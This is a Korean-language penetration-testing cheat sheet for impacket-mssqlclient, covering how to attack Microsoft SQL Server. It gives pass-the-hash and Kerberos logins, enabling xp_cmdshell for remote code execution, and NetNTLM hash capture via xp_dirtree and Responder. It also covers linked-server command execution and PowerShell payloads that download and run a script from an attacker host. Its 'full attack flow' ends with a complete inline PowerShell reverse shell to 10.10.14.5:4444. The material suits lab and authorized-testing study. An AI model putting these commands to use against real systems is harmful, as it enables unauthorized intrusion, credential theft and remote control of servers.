---
sidebar_position: 1
---

# impacket-mssqlclient - 1433

> https://github.com/fortra/impacket

Impacket의 MSSQL 클라이언트 도구입니다.

## 설치

```bash
# Kali Linux
sudo apt install impacket-scripts

# pip
pip install impacket
```

## 연결 방법

### 기본 연결

```bash
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST>
```

### Windows 인증

```bash
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient <RHOST>/<USERNAME>:<PASSWORD>@<RHOST> -windows-auth
impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST> -windows-auth
```

### Kerberos 인증

```bash
# 티켓 없이
impacket-mssqlclient -k -no-pass <RHOST>

# 티켓 지정
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

### Hash 사용 (Pass-the-Hash)

```bash
impacket-mssqlclient <USERNAME>@<RHOST> -hashes :<NTHASH>
impacket-mssqlclient <DOMAIN>/<USERNAME>@<RHOST> -hashes <LMHASH>:<NTHASH> -windows-auth
```

## 유용한 명령어

### 열거 명령어

```bash
SQL> enum_logins          # 로그인 계정 열거
SQL> enum_impersonate     # 가장 가능한 계정 열거
SQL> enum_db              # 데이터베이스 열거
```

### xp_cmdshell 관리

```bash
SQL> enable_xp_cmdshell   # xp_cmdshell 활성화
SQL> disable_xp_cmdshell  # xp_cmdshell 비활성화
SQL> xp_cmdshell whoami   # 명령 실행
```

## 기본 SQL 쿼리

### 정보 수집

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT name FROM sys.databases;
```

### xp_cmdshell 수동 활성화

```sql
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 명령 실행

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')"';
```

## 공격 시나리오

### 1. 기본 연결 및 열거

```bash
# 연결
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth

# 로그인 계정 확인
SQL> enum_logins

# 가장 가능한 계정 확인
SQL> enum_impersonate
```

### 2. xp_cmdshell을 통한 RCE

```bash
# xp_cmdshell 활성화
SQL> enable_xp_cmdshell

# 명령 실행
SQL> xp_cmdshell whoami
SQL> xp_cmdshell dir C:\

# Reverse Shell
SQL> xp_cmdshell powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
```

### 3. 파일 읽기

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;
```

### 4. NetNTLM Hash 캡처

```bash
# Responder 실행
sudo responder -I tun0

# MSSQL에서
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\share'
```

## Kerberos 인증 예제

### 1. 티켓 획득

```bash
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
export KRB5CCNAME=<USERNAME>.ccache
```

### 2. 연결

```bash
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

## 링크 서버 공격

### 링크 서버 열거

```sql
SELECT srvname,isremote FROM sysservers;
EXEC sp_linkedservers;
```

### 링크 서버를 통한 명령 실행

```sql
EXEC ('SELECT current_user') at [<LINKED_SERVER>];
EXEC ('EXEC xp_cmdshell ''whoami''') at [<LINKED_SERVER>];
```

## 옵션

```bash
-windows-auth           # Windows 인증 사용
-k                      # Kerberos 인증 사용
-no-pass                # 비밀번호 없이 (Kerberos)
-hashes LMHASH:NTHASH   # NTLM Hash 사용
-dc-ip IP               # Domain Controller IP
-target-ip IP           # 타겟 IP (호스트명 대신)
-port PORT              # 포트 (기본 1433)
-db DATABASE            # 기본 데이터베이스
-file FILE              # SQL 파일 실행
```

## 스크립트 실행

### SQL 파일 실행

```bash
impacket-mssqlclient <USERNAME>@<RHOST> -file commands.sql
```

commands.sql:

```sql
SELECT @@version;
EXEC xp_cmdshell 'whoami';
SELECT name FROM sys.databases;
```

## 예제 워크플로우

### 전체 공격 흐름

```bash
# 1. 연결
impacket-mssqlclient Administrator:Password123@10.10.10.100 -windows-auth

# 2. 열거
SQL> enum_logins
SQL> enum_impersonate

# 3. xp_cmdshell 활성화
SQL> enable_xp_cmdshell

# 4. 정찰
SQL> xp_cmdshell whoami
SQL> xp_cmdshell hostname
SQL> xp_cmdshell ipconfig

# 5. Reverse Shell
SQL> xp_cmdshell powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 참고

- MSSQL은 기본적으로 1433 포트 사용
- xp_cmdshell은 기본적으로 비활성화
- sysadmin 권한이 있어야 xp_cmdshell 활성화 가능
- Windows 인증 시 도메인 자격증명 필요
- Kerberos 인증 시 KRB5CCNAME 환경변수 설정
- 링크 서버를 통한 권한 상승 가능
- NetNTLM 해시 캡처로 크랙 또는 릴레이 공격 가능
